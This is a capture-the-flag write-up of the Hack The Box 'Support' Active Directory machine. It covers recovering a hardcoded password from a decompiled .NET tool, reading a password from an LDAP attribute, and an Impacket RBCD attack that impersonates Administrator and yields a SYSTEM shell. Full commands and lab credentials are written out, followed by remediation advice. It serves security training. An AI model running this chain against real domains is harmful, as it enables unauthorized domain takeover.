## Summary

Support is an Easy Windows Active Directory machine. An anonymous SMB share
exposes a custom `UserInfo.exe` tool whose .NET binary contains a hardcoded,
XOR+Base64-"encrypted" password for the `ldap` account. Authenticated LDAP
queries reveal the `support` user's password in the `info` attribute, granting
WinRM access. BloodHound shows `support` has **GenericAll** over the Domain
Controller object, which is abused via **Resource-Based Constrained Delegation
(RBCD)** to impersonate `Administrator` and compromise the DC.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Support | Easy | Windows | Hack The Box |

## Attack Path

1. Nmap identifies a Windows Domain Controller (Kerberos, LDAP, SMB).
2. Anonymous SMB enumeration finds the `support-tools` share.
3. `UserInfo.exe` is downloaded and decompiled with `ilspycmd`.
4. A hardcoded password and its XOR+Base64 routine are recovered.
5. The routine is reimplemented in Python to recover the `ldap` password.
6. Authenticated LDAP reveals the `support` password in the `info` attribute.
7. WinRM access is obtained as `support`.
8. SharpHound/BloodHound reveal `GenericAll` over `DC$`.
9. RBCD is configured and used to impersonate `Administrator`.
10. The root flag is read on the Domain Controller.

## Reconnaissance

Initial enumeration was performed with **Nmap**.

```bash
nmap -sC -sV -A -T4 10.129.55.108
```

The host was a Windows Domain Controller exposing DNS (53), Kerberos (88), LDAP
(389/636/3268), SMB (445), WinRM (5985) and related services. LDAP revealed the
domain `support.htb` and host `dc.support.htb`, which were added to
`/etc/hosts`.

## SMB Enumeration

SMB shares were listed with an anonymous session:

```bash
smbclient -L //10.129.55.108/ -N
```

A custom share `support-tools` ("support staff tools") allowed anonymous access:

```bash
smbclient //10.129.55.108/support-tools -U Anonymous -N
```

Among the portable tools, the custom `UserInfo.exe.zip` stood out and was
downloaded for analysis.

## Binary Analysis — UserInfo.exe

`UserInfo.exe` was a .NET application, decompiled with `ilspycmd`:

```bash
ilspycmd -p -o decompiled UserInfo.exe
```

### Hardcoded password

`Protected.cs` contained an encrypted password and the key used to protect it:

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E=";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    for (int i = 0; i < array.Length; i++)
        array[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
    return Encoding.Default.GetString(array);
}
```

The routine Base64-decodes the value, XORs each byte with the key `armando`,
then XORs with `0xDF`.

### Recovering the password

The routine was reimplemented in Python:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E="
key = b"armando"

data = base64.b64decode(enc_password)
password = bytes((data[i] ^ key[i % len(key)]) ^ 0xDF for i in range(len(data)))
print(password.decode())
```

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

`LdapQuery.cs` confirmed the credential belonged to `support\ldap`, which bound
to LDAP using this password.

## LDAP Enumeration

With the `ldap` credentials, authenticated LDAP queries were possible. Searching
the `support` user's attributes:

```bash
ldapsearch -x -H ldap://10.129.55.108 \
  -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'dc=support,dc=htb' \
  '(sAMAccountName=support)' '*'
```

The `info` attribute leaked a plaintext password — a classic AD anti-pattern:

```
info: Ironside47pleasure40Watchful
```

## Initial Access (User)

`support` was a member of `Remote Management Users`, so WinRM access was
possible:

```bash
evil-winrm -i 10.129.55.108 -u support -p 'Ironside47pleasure40Watchful'
```

The user flag lives at `C:\Users\support\Desktop\user.txt`.

## Privilege Escalation

### BloodHound — GenericAll over DC$

SharpHound was uploaded and run to collect AD data:

```powershell
upload SharpHound.exe
./SharpHound.exe -c All --zipfilename support_data
```

In BloodHound, with `support` marked owned, the attack path was clear:

```
SUPPORT --[MemberOf]--> SHARED SUPPORT ACCOUNTS --[GenericAll]--> DC.SUPPORT.HTB
```

`GenericAll` over the `DC$` computer object allows writing
`msDS-AllowedToActOnBehalfOfOtherIdentity` — the basis for RBCD.

### RBCD attack

**Step 1 — Create a fake computer** (default `MachineAccountQuota=10` allows it):

```bash
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123!' \
  -dc-ip 10.129.55.234 'support.htb/support:Ironside47pleasure40Watchful'
```

**Step 2 — Configure RBCD on DC$:**

```bash
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'DC$' -action 'write' \
  -dc-ip 10.129.55.234 'support.htb/support:Ironside47pleasure40Watchful'
```

**Step 3 — Request a TGS impersonating Administrator:**

```bash
impacket-getST -spn 'cifs/dc.support.htb' -impersonate 'Administrator' \
  -dc-ip 10.129.55.234 'support.htb/FAKE01$:FakePass123!'
```

This performed S4U2Self + S4U2Proxy and saved a ticket for `Administrator`.

**Step 4 — Access the DC as Administrator:**

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec -k -no-pass dc.support.htb
```

This returned a SYSTEM shell on the Domain Controller. The root flag lives at
`C:\Users\Administrator\Desktop\root.txt`.

## Vulnerability Analysis

**Anonymous SMB share access** — the `support-tools` share allowed null-session
access, exposing internal binaries with embedded credentials. Fix: disable
anonymous SMB access and restrict share permissions.

**Hardcoded password in .NET binary** — `UserInfo.exe` stored the `ldap`
password with XOR+Base64 and an embedded key, which is trivially reversible. Fix:
never embed credentials in binaries; use a secure secret store.

**Plaintext password in AD `info` attribute** — the `support` user's password was
stored in the readable `info` attribute, recoverable by any authenticated user.
Fix: never store secrets in descriptive AD attributes and audit them.

**GenericAll over the Domain Controller** — `Shared Support Accounts` had
`GenericAll` over `DC$`, enabling RBCD and impersonation of any domain user. Fix:
remove excessive ACLs over computer objects and follow least privilege.

**Default MachineAccountQuota** — any authenticated user could create computer
accounts (quota of 10), a prerequisite for the RBCD attack. Fix: set
`MachineAccountQuota` to 0 in hardened environments.

## Tools Used

- Nmap
- smbclient
- ilspycmd
- Python 3
- ldapsearch
- evil-winrm
- SharpHound / BloodHound CE
- Impacket (addcomputer, rbcd, getST, psexec)

## Key Takeaways

- Custom SMB shares must be audited even when they look "internal".
- .NET binaries are easily decompiled; credentials must never be embedded.
- Encryption with a hardcoded key is obfuscation, not security.
- AD descriptive attributes (`info`, `description`) are readable by any user and must be treated as public.
- BloodHound is essential for spotting indirect privileges via group membership.
- `GenericAll` over a computer object enables RBCD and full impersonation without direct admin rights.
- The default `MachineAccountQuota` should be set to 0 in hardened environments.
